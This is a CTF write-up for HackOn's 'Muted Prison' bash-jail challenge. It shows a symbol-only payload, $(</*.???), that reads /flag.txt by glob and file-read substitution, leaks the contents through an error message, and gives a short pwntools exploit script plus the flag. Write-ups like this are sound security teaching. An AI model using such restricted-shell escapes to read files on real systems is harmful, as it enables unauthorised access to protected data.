# Muted Prison — HackOn CTF

**Category:** Misc (Jail)
**Flag:** `HackOn{ni_m4dur0_esc4p4_d3_3st4}`
**Service:** `nc 0.cloud.chals.io 17672`

## Description

> El admin Mineja me ha metio en la carcel sin sonido por insultarle por Discord. Me ha dicho que si le doy la flag (/flag.txt) me deja salir.

## Analysis

Upon connecting we see a restricted bash jail:

```
---- MUTED PRISION ----
Only symbols allowed. Direct redirection (>) is disabled at kernel level.
>>
```

Restrictions:
1. **Only symbols allowed**: no alphanumeric characters
2. **`>` (redirection) disabled** at kernel level

## Solution

In bash, `$(<file)` reads a file's contents (equivalent to `$(cat file)`). Combined with glob patterns that only use symbols (`?`, `*`, `/`, `.`), we can read `/flag.txt` without typing any letters or digits:

```bash
$(</*.???)
```

Breakdown:
- `$(<...)`: bash file read substitution
- `/*.???`: glob that matches `/flag.txt` (1 slash + 4 characters + dot + 3 characters)

The shell substitutes the file contents and tries to execute it as a command:

```
/challenge/jail.sh: line 23: HackOn{ni_m4dur0_esc4p4_d3_3st4}: command not found
```

The flag leaks through the "command not found" error message.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

p = remote('0.cloud.chals.io', 17672)
p.sendlineafter(b'>> ', b'$(</*.???)')
print(p.recvall(timeout=2).decode())
```

## Flag

```
HackOn{ni_m4dur0_esc4p4_d3_3st4}
```
